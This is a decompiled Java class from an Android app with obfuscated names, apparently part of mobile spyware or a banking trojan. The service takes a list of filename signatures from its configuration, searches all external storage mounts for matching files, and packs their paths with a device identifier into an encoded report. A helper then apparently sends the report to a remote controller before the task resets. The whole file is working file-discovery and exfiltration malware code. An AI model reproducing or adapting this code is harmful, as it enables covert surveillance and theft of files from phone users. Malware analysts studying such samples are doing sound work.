package wocwvy.czyxoxmbauu.slsa;

import android.app.IntentService;
import android.content.Intent;
import android.os.Environment;
import java.io.File;

/* JADX INFO: loaded from: classes.dex */
public class mvqkjokaxfrpf extends IntentService {

    /* JADX INFO: renamed from: a */
    C0020b f443a;

    /* JADX INFO: renamed from: b */
    String f444b;

    /* JADX INFO: renamed from: c */
    String[] f445c;

    public mvqkjokaxfrpf() {
        super("mvqkjokaxfrpf");
        this.f443a = new C0020b();
        this.f444b = "";
    }

    /* JADX INFO: renamed from: a */
    void m284a(File file) {
        try {
            System.out.println(file);
            for (File file2 : file.listFiles()) {
                if (file2.isDirectory()) {
                    m285b(file2);
                } else if (file2.isFile()) {
                    for (int i = 0; i < this.f445c.length; i++) {
                        String str = this.f445c[i];
                        if (str.length() > 1 && file2.getName().contains(str)) {
                            this.f444b += "|*|" + file2.getAbsolutePath() + "\n";
                        }
                    }
                }
            }
        } catch (Exception unused) {
        }
    }

    /* JADX INFO: renamed from: b */
    void m285b(File file) {
        for (File file2 : file.listFiles()) {
            if (file2.isDirectory()) {
                m285b(file2);
            } else if (file2.isFile()) {
                for (int i = 0; i < this.f445c.length; i++) {
                    String str = this.f445c[i];
                    if (str.length() > 1 && file2.getName().contains(str)) {
                        this.f444b += "|*|" + file2.getAbsolutePath() + "\n";
                    }
                }
            }
        }
    }

    @Override // android.app.IntentService
    protected void onHandleIntent(Intent intent) {
        try {
            String strM251e = this.f443a.m251e(this, "findfiles");
            if (strM251e.contains("/")) {
                this.f445c = strM251e.split("/");
            } else {
                this.f445c[0] = strM251e;
            }
            File file = new File("/mnt");
            File file2 = new File("/mount");
            File file3 = new File("/sdcard");
            File file4 = new File("/storage");
            File file5 = new File("/Removable");
            m284a(Environment.getExternalStorageDirectory());
            m284a(file);
            m284a(file2);
            m284a(file3);
            m284a(file4);
            m284a(file5);
            String strReplace = this.f444b.replace("|*|", "");
            if (strReplace.length() > 10) {
                C0020b c0020b = this.f443a;
                StringBuilder sb = new StringBuilder();
                sb.append("p=");
                C0020b c0020b2 = this.f443a;
                sb.append(c0020b2.m242c(this.f443a.m264q(this) + "|" + ("Found files by signatures:\n" + strReplace) + "|"));
                c0020b.m235b(this, "4", sb.toString());
            }
            this.f443a.m250d(this, "findfiles", "**false**");
        } catch (Exception unused) {
        }
    }
}
